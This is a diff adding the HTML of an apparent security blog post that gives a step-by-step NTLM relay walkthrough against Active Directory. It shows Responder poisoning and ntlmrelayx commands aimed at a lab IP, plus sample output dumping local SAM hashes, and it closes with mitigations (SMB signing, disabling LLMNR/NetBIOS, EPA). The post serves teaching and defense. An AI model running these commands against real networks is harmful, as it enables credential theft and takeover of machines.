@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NTLM Relay Attacks in 2026 // ngr3p</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body class="single-post">
+    <div id="loader-wrapper">
+        <div class="loader-content">
+            <div class="progress-container">
+                <div class="progress-fill" id="progress-bar"></div>
+            </div>
+        </div>
+    </div>
+    
+    <header class="main-header header-scrolled">
+        <nav class="nav-container container">
+            <a href="index.html" class="brand-logo">
+                <img src="assets/images/ui/logo.png" alt="ngr3p">
+            </a>
+            <ul class="nav-links">
+                <li><a href="index.html#blog">Blog</a></li>
+                <li><a href="index.html#about">About</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="post-content-area container">
+        <article class="full-post">
+            <header class="post-header">
+                <span class="post-cat">#ActiveDirectory</span>
+                <h1 class="entry-title">NTLM Relay Attacks in 2026: Exploiting Legacy Trust</h1>
+                <div class="post-meta">January 09, 2026 • 15 min read</div>
+            </header>
+
+            <section class="post-body">
+                <h2>0x00 - Executive Summary</h2>
+                <p>Despite modern defenses, <strong>NTLM Relay</strong> remains a critical threat in 2026. This guide provides a complete, step-by-step walkthrough on how to intercept and relay authentication requests in an Active Directory environment to achieve <strong>Remote Code Execution (RCE)</strong> or <strong>Privilege Escalation</strong>.</p>
+
+                <h2>0x01 - Prerequisites & Tooling</h2>
+                <p>To follow this guide, ensure your lab meets the following requirements:</p>
+                <ul>
+                    <li><strong>Attacker Machine:</strong> Kali Linux (Updated).</li>
+                    <li><strong>Environment:</strong> Active Directory Domain with at least one Windows Server/Workstation where <strong>SMB Signing is NOT enforced</strong>.</li>
+                    <li><strong>Tools:</strong>
+                        <ul>
+                            <li><a href="https://github.com/lgandx/Responder" target="_blank">Responder</a>: For LLMNR/mDNS poisoning.</li>
+                            <li><a href="https://github.com/fortra/impacket" target="_blank">Impacket (ntlmrelayx)</a>: For the core relay engine.</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <h2>0x02 - The Theory: Why it still works</h2>
+                <p>The core of the issue is that NTLM authentication does not verify the identity of the server. As long as the target does not require SMB Signing, it will accept the relayed session as legitimate.</p>
+
+                <h2>0x03 - Step-by-Step Execution</h2>
+                
+                <h3>Step 1: Network Poisoning</h3>
+                <p>We start by capturing broadcast traffic. Run Responder to listen for LLMNR, NBT-NS, and mDNS requests.</p>
+                <div class="terminal-block">
+                    <div class="terminal-header">
+                        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+                        <span class="file-name">kali@ngr3p: ~</span>
+                    </div>
+                    <pre><code>sudo responder -I eth0 -dwv</code></pre>
+                </div>
+
+                <h3>Step 2: Configuring the Relay</h3>
+                <p>In a second terminal, set up <code>ntlmrelayx.py</code>. We will target a specific IP and attempt to dump the local SAM database upon successful relay.</p>
+
+                <div class="screenshot-container">
+                    <div class="terminal-header">
+                        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+                    </div>
+                    <img src="assets/images/posts/burp.jpg" alt="Burp Suite Relay Configuration">
+                    <figcaption class="post-image figcaption">
+                        Captura 1.1: Monitorando tráfego NTLM interceptado via Proxy para validar alvos vulneráveis.
+                    </figcaption>
+                </div>
+
+                <div class="terminal-block">
+                    <div class="terminal-header">
+                        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+                        <span class="file-name">bash — ntlmrelayx.py</span>
+                    </div>
+                    <pre><code>python3 ntlmrelayx.py -t smb://192.168.1.150 -smb2support</code></pre>
+                </div>
+
+                <h3>Step 3: Triggering the Victim</h3>
+                <p>The attack completes when a victim attempts to access a non-existent network share, forcing their machine to broadcast a request.</p>
+
+                <h2>0x04 - Proof of Concept (PoC)</h2>
+                <p>Once the relay is successful, the tool automatically executes the <strong>secretsdump</strong> routine:</p>
+
+                <div class="terminal-block">
+                    <div class="terminal-header">
+                        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+                        <span class="file-name">output — ntlmrelayx.py</span>
+                    </div>
+                    <pre><code>[*] SMBD-Relay: Connection from 192.168.1.50 controlled.
+[*] Targeting: smb://192.168.1.150
+[+] Authenticating as DOMAIN\VictimUser...
+[+] Authentication Successful! Dumping local SAM hashes...
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+[*] Done! Check /tmp/ngr3p_hashes.txt for full logs.</code></pre>
+                </div>
+
+                <h2>0x05 - Offense informs Defense</h2>
+                <p>To mitigate this attack, the most effective measures are:</p>
+                <ul>
+                    <li><strong>Enable SMB Signing:</strong> Set 'Require' for both Client and Server communications.</li>
+                    <li><strong>Disable Legacy Protocols:</strong> Turn off LLMNR and NetBIOS over TCP/IP.</li>
+                    <li><strong>EPA:</strong> Enable Extended Protection for Authentication on sensitive services.</li>
+                </ul>
+            </section>
+        </article>
+    </main>
+
+    <footer class="main-footer">
+        <div class="container footer-content">
+            <p>&copy; 2026 ngr3p // Offense informs Defense.</p>
+            <div class="footer-links">
+                <a href="https://github.com/ngr3p" target="_blank" title="Source Code & Tools"><i class="fa-brands fa-github"></i></a>
+                <a href="https://x.com/ngr3p" target="_blank" title="Infosec News & Threads"><i class="fa-brands fa-x-twitter"></i></a>
+                <a href="https://instagram.com/ngr3p" target="_blank" title="Technical Carousels"><i class="fa-brands fa-instagram"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
